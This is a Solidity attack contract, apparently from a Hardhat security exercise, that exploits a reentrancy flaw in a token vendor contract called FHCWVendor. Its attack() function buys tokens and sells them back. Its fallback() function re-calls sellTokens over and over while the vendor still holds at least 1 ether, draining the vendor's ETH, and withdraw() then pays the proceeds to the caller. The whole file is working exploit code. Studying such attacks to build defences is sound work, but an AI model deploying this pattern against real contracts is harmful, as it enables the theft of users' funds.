// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "hardhat/console.sol";
import "../FHCWVendor.sol";

contract SC01 {
    FHCWVendor public vendor;
    uint256 private constant ethFor1000 = 1 ether;
    uint256 private constant tokensToSell = 1000;

    constructor(address payable _vendorAddress) {
        vendor = FHCWVendor(_vendorAddress);
    }

    fallback() external payable {
        if (address(vendor).balance >= ethFor1000) {
            console.log("Remaining balance: ", address(vendor).balance);
            vendor.sellTokens(tokensToSell);
        } else {
            console.log("We are done");
        }
    }

    function attack() external payable {        
        console.log("Attack Value sent: ", msg.value);
        require(msg.value >= 1 ether, "1 or more ether is needed to attack");

        uint256 sellAmount = tokensToSell * (msg.value / 10 ** 18);

        console.log("Attack deposited: ", msg.value / 10 ** 18);
        vendor.buyTokens{value: msg.value}();
        console.log("Attacks sells: ", sellAmount);
        vendor.sellTokens(sellAmount);
    }

    function withdraw() public {
        (bool rec,) = msg.sender.call{value: address(this).balance}("");
        require(rec, "Couldn't transfer ETH");
    }
}